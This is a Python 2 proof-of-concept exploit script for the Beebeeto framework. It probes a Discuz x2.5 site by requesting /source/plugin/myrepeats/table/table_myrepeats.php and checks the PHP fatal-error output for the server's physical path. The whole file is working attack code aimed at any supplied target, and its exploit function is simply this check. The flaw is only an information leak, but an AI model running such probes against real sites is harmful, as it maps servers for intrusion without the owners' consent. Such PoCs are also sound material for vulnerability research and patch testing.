#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0082',
            'name': 'Discuz x2.5 /source/plugin/myrepeats/table/table_myrepeats.php 泄漏服务器物理路径 POC',
            'author': '1024',
            'create_date': '2014-10-18',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Discuz',
            'vul_version': ['x2.5'],
            'type': 'Information Disclosure',
            'tag': ['Discuz漏洞', '爆物理路径漏洞', '/table_myrepeats.php'],
            'desc': 'N/A',
            'references': ['http://www.2cto.com/Article/201211/171301.html',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + '/source/plugin/myrepeats/table/table_myrepeats.php'
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if '<b>Fatal error</b>:' in content and '/table_myrepeats.php</b>' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            return args
        args['success'] = False
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())